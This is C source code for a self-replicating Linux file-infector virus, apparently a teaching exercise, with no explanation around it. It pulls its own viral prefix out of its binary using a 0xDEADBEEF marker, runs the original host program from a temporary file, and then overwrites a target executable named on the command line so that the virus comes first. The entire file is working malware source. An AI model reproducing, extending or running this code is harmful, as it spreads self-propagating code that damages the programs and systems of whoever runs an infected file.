#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <errno.h>

int checkForVirus(char *arg);
int infectWithVirus(char *argv, char *virusBuf, int virusLen);

int main(int argc, char **argv, char **envp) {
    char *virBuf;
    int fd, execFd, status;
    char tempExec[100];
    struct stat fstatInfo;

    // Finds the executable directory to be modified
    char dest[PATH_MAX];
    if (readlink("/proc/self/exe", dest, PATH_MAX) == -1) {
        exit(errno);
    }
    
    // Creates a temporary file
    sprintf(tempExec, "/tmp/host.%u", getuid());
    if ((fd = open(tempExec, O_RDWR | O_CREAT | O_EXCL, S_IRWXU | S_IXGRP | S_IXOTH)) == -1) {
        unlink(tempExec);
        exit(errno);
    }

    if ((execFd = open(dest, O_RDONLY)) == -1) {
        close(fd);
        exit(errno);
    }

    if (fstat(execFd, &fstatInfo) == -1) {
        close(fd);
        exit(errno);
    }

    // Put the virus in a buffer by finding an offset.
    char offBuf = 0x00;
    int offsetState = 0, virLen = 0;
    virBuf = malloc(sizeof(char) * fstatInfo.st_size);
    while (read(execFd, &offBuf, 1) == 1) {
        memcpy(&virBuf[virLen++], &offBuf, 1);
        if (offsetState == 0 && (offBuf & 255) == 0xDE) {
            offsetState = 1;
        } else if (offsetState == 1) {
            if ((offBuf & 255) == 0xAD) {
                offsetState = 2;
            } else {
                offsetState = 0;
            }
        } else if (offsetState == 2) {
            if ((offBuf & 255) == 0xBE) {
                offsetState = 3;
            } else {
                offsetState = 0;
            }
        } else if (offsetState == 3) {
            if ((offBuf & 255) == 0xEF) {
                offsetState = 4;
                break;
            } else {
                offsetState = 0;
            }
        }
    }

    if (offsetState == 4) {
        // Offset is now at beginning of host program.
        char finalBuf;
        while (read(execFd, &finalBuf, 1) > 0) {
            write(fd, &finalBuf, 1);
        }
        close(execFd);
        close(fd);

        // Execute the process
        if (fork() == 0) {
            if (execve(tempExec, argv, envp) == -1) {
                exit(errno);
            }
        }
        wait(&status);

        if (unlink(tempExec) == -1) {
            exit(1);
        }

        int checkRet = checkForVirus(argv[1]);
        if (checkRet == 0) {
            infectWithVirus(argv[1], virBuf, virLen);
        } else if (checkRet == -1) {
            exit(1);
        }
        free(virBuf);
    } else {
        // Binary could not be parsed
        free(virBuf);
        exit(1);
    }

    return 0;
}

int checkForVirus(char *argv) {
    // Open file from argv[1]
    int fd, offsetState = 0;
    char offBuf = 0x00;
    struct stat fstatInfo;

    if ((fd = open(argv, O_RDONLY)) == -1) {
        return -1;
    }

    // fstat file
    if (fstat(fd, &fstatInfo) == -1) {
        close(fd);
        return -1;
    }

    // fstatInfo.st_mode & S_IXUSR || 
    if ((fstatInfo.st_mode & S_IXGRP || fstatInfo.st_mode & S_IXOTH) || !(fstatInfo.st_mode & S_IWUSR)) {
        close(fd);
        return -1;
    }

    // Checks for 0xDEADBEEF
    while (read(fd, &offBuf, 1) == 1) {
        if (offsetState == 0 && (offBuf & 255) == 0xDE) {
            offsetState = 1;
        } else if (offsetState == 1) {
            if ((offBuf & 255) == 0xAD) {
                offsetState = 2;
            } else {
                offsetState = 0;
            }
        } else if (offsetState == 2) {
            if ((offBuf & 255) == 0xBE) {
                offsetState = 3;
            } else {
                offsetState = 0;
            }
        } else if (offsetState == 3) {
            if ((offBuf & 255) == 0xEF) {
                offsetState = 4;
                break;
            } else {
                offsetState = 0;
            }
        }
    }
    close(fd);

    if (offsetState != 4) {
        return 0;
    }
    return 1;
}

int infectWithVirus(char *argv, char *virusBuf, int virusLen) {
    char *fileBuf;
    char offBuf = 0x00;
    int fd, i = 0;
    struct stat fstatInfo;

    // Opens up the file to be infected
    if ((fd = open(argv, O_RDONLY)) == -1) {
        return -1;
    }

    // fstat file
    if (fstat(fd, &fstatInfo) == -1) {
        close(fd);
        return -1;
    }

    fileBuf = malloc(sizeof(char) * fstatInfo.st_size);
    while (read(fd, &offBuf, 1) == 1) {
        memcpy(&fileBuf[i++], &offBuf, 1);
    }
    close(fd);

    if ((fd = open(argv, O_RDWR | O_TRUNC)) == -1) {
        return -1;
    }

    for (i = 0; i < virusLen; i++) {
        write(fd, &virusBuf[i], 1);
    }
    for (i = 0; i < fstatInfo.st_size; i++) {
        write(fd, &fileBuf[i], 1);
    }

    close(fd);
    free(fileBuf);
    return 0;
}